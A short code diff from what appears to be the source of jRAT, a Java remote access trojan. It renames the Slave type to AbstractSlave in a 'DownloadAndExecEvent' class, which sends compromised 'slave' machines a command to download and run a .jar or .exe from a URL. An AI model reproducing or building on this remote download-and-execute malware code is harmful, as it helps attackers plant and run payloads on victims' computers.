@@ -3,7 +3,7 @@ package su.jrat.client.events;
 import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
-import su.jrat.client.Slave;
+import su.jrat.client.AbstractSlave;
 import su.jrat.client.packets.outgoing.Packet17DownloadExecute;
 import su.jrat.client.utils.IconUtils;
 import su.jrat.client.utils.Utils;
@@ -23,7 +23,7 @@ public class DownloadAndExecEvent extends Event {
 		return new Object[] { icon, super.name, toString(), url, jar ? ".jar" : ".exe" };
 	}
 
-	public void perform(Slave slave) {
+	public void perform(AbstractSlave slave) {
 		slave.addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
 	}
 
